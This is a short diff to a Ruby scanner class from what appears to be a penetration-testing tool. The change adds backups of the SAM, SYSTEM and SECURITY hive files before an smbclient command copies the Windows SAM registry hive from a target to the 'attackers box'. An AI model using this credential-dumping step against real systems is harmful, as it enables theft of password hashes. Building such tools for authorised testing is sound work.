@@ -54,6 +54,10 @@ class HashesWorkstation < Poet::Scanner
 		temp_directory.gsub!('C:', '') if temp_directory
 
 		# download registry hives to attackers box
+		backup_file("#{@log}/hashes/#{host}/sam")
+		backup_file("#{@log}/hashes/#{host}/system")
+		backup_file("#{@log}/hashes/#{host}/security")
+
 		sam = smbclient(clientoptions, "get #{temp_directory}\\sam #{@log}/hashes/#{host}/sam")
 
 		if not check_status(sam)
